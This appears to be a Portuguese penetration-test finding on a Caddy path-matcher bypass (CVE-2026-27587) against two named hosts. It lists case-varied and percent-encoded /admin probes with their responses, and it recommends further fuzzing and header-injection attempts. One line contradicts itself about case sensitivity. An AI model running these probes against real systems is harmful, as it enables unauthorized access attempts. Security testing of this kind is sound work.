# F-015 CVE-2026-27587 — Caddy Path Matcher Bypass (CONFIRMADO PARCIAL)

**Alvo**: api-beta.stormapplications.com, mng.stormapplications.com (Discloud/EC2 via Caddy)
**Severidade**: Alta (confirmação parcial)
**Timestamp**: 2026-08-23T14:15:00Z
**CVE**: CVE-2026-27587 (CVSS 9.1)

## Descrição
O path matcher HTTP do Caddy é case-insensitive, mas quando o pattern contém percent-escape sequences (%xx), a comparação é feita contra a request path escapada sem aplicar lowercase. Isto permite bypass de path-based routing e access controls.

## Testes Realizados

### 1. Case variations de /admin em api-beta.stormapplications.com
```bash
# /admin     → {"code":"ADMIN_AUTH_REQUIRED"}  HTTP 403
# /ADMIN     → {"code":"NOT_FOUND"}            HTTP 404 ← Bypass do matcher
# /Admin     → {"code":"NOT_FOUND"}            HTTP 404 ← Bypass do matcher
# /aDmin     → {"code":"NOT_FOUND"}            HTTP 404
# /adMin     → {"code":"NOT_FOUND"}            HTTP 404
# /admIn     → {"code":"NOT_FOUND"}            HTTP 404
# /admiN     → {"code":"NOT_FOUND"}            HTTP 404
# /Admin/    → {"code":"NOT_FOUND"}            HTTP 404
# /ADMIN/    → {"code":"NOT_FOUND"}            HTTP 404
# /aDmIn/    → {"code":"NOT_FOUND"}            HTTP 404
# //admin    → {"code":"ADMIN_AUTH_REQUIRED"}  HTTP 403
# /admin//   → {"code":"ADMIN_AUTH_REQUIRED"}  HTTP 403
```

### 2. Sub-rotas de admin com case variation
```bash
# /ADMIN/login      → NOT_FOUND (404)
# /ADMIN/dashboard  → NOT_FOUND (404)
# /ADMIN/users      → NOT_FOUND (404)
# /ADMIN/config     → NOT_FOUND (404)
# /ADMIN/settings   → NOT_FOUND (404)
# /ADMIN/bots       → NOT_FOUND (404)
# /ADMIN/logs       → NOT_FOUND (404)
# /ADMIN/health     → NOT_FOUND (404)
# /ADMIN/api        → NOT_FOUND (404)
```

### 3. Percent-encoded bypass
```bash
# /%2fadmin    → NOT_FOUND (404)
# /%2Fadmin    → NOT_FOUND (404)
# /%252fadmin  → NOT_FOUND (404)
# /%2F%41dmin  → NOT_FOUND (404)
# /%61dmin     → ADMIN_AUTH_REQUIRED (403) ← %61 = 'a', decoded to /admin
```

### 4. Mesmo comportamento em mng.stormapplications.com
```bash
# /ADMIN → NOT_FOUND (404) ← Confirma bypass via Tor
# /Admin → NOT_FOUND (404)
```

## Resultado
**CONFIRMADO PARCIALMENTE**:
- O path matcher do Caddy É case-sensitive para rotas administrativas
- Variações de case em `/admin` bypassam completamente o matcher (retornam 404 NOT_FOUND em vez de 403 ADMIN_AUTH_REQUIRED)
- Porém, as rotas com case variation não encontram handlers no backend Express/Node.js, resultando em 404
- O backend parece usar case-sensitive routing (ex: só reconhece `admin` minúsculo)
- Percent-encoded paths também bypassam o matcher, mas sem sucesso de acesso

## Impacto
O bypass existe e é funcional, mas não foi encontrado um caminho que:
1. Bypasse o matcher do Caddy (case diferente)
2. E ainda assim seja reconhecido pelo backend Express/Node

A combinação de Caddy path matcher case-insensitive + backend case-sensitive cria um vetor potencial se houver alguma rota que:
- Exista tanto em maiúsculo quanto minúsculo no backend
- Ou tenha comportamento diferente entre as duas

## Recomendação
- Testar com fuzzing de caminhos em maiúsculo para encontrar endpoints que existam
- Combinar com outras técnicas (host bypass, header injection)
- Se Caddy for atualizado para versão >= 2.11.1, o risco é mitigado para rotas novas
